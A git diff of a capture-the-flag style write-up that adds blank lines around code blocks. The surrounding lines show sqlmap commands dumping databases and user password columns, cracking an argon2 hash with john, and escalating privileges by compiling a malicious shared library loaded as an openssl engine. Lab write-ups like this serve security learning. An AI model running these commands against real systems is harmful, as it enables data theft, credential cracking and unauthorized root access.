@@ -98,6 +98,7 @@ Check for SQLi
 ![image16](../resources/70dd44a9d5034da39831800f4beed438.png)
 
 - **Dump databases' names**
+
 ```bash
 msqlmap -r request --batch --dbs
 
@@ -106,6 +107,7 @@ msqlmap -r request --batch --dbs
 ![image17](../resources/bf281e5fad0e4eb0a6169f8c6d40e4db.png)
 
 - **Dump tables for database vn_admin**
+  
 ```bash
 sqlmap -r request --batch -D vn_admin --tables
 
@@ -114,6 +116,7 @@ sqlmap -r request --batch -D vn_admin --tables
 ![image18](../resources/025069d7572e499bb4b828bd0141e780.png)
 
 - **Dump columns for table be_users**
+  
 ```bash
 sqlmap -r request --batch -D vn_admin -T be_users --columns
 
@@ -122,6 +125,7 @@ sqlmap -r request --batch -D vn_admin -T be_users --columns
 ![image19](../resources/aaf6c6c7d29044bc853ba56dca3bb30b.png)
 
 - **Dump username and password columns**
+  
 ```bash
 sqlmap -r request --batch -D vn_admin -T be_users -C username,password --dump
 
@@ -138,6 +142,7 @@ Hash is in **argon2** format:
 Attempted to crack it with a python script - Argon2_Cracker but it took too long and crashed
 
 - Do the same for blog database:
+  
 ```bash
 sqlmap -r request --batch -D blog --tables
 
@@ -150,6 +155,7 @@ sqlmap -r request --batch -D blog -T users -C username,password,id --dump
 ![image21](../resources/36619d94d1204ee5882f32500a05cd9e.png)
 
 - Or just do:
+  
 ```bash
 sqlmap -r request --batch --dump-all --exclude-sysdb
 
@@ -166,6 +172,7 @@ The output is in:
 - I used the program I made and split the csv to get the passwords column and save in **pass.txt**
 
 - Crack, the hash found before, with john:
+  
 ```bash
 john hash_argon --wordlist=pass.txt
 
@@ -324,6 +331,7 @@ The capability **=ep** means the binary has **all capabilities**
 Steps to exploit:
 
 - Download the c libraries (on Kali):
+  
 ```bash
 sudo apt install libssl-dev
 
@@ -347,17 +355,20 @@ IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
 
 - Now compile it using gcc:
+  
 ```bash
 gcc -fPIC -o exploit.o -c exploit.c
 gcc -shared -o exploit.so -lcrypto exploit.o
 
 ```
 - Transfer from Kali to victim machine (with python)
+  
 ```bash
 chmod +x exploit.so
 ```
 
 - Use the full path to openssl (as in getcap):
+  
 ```bash
 /home/system/Utils/openssl req -engine ./exploit.so
 
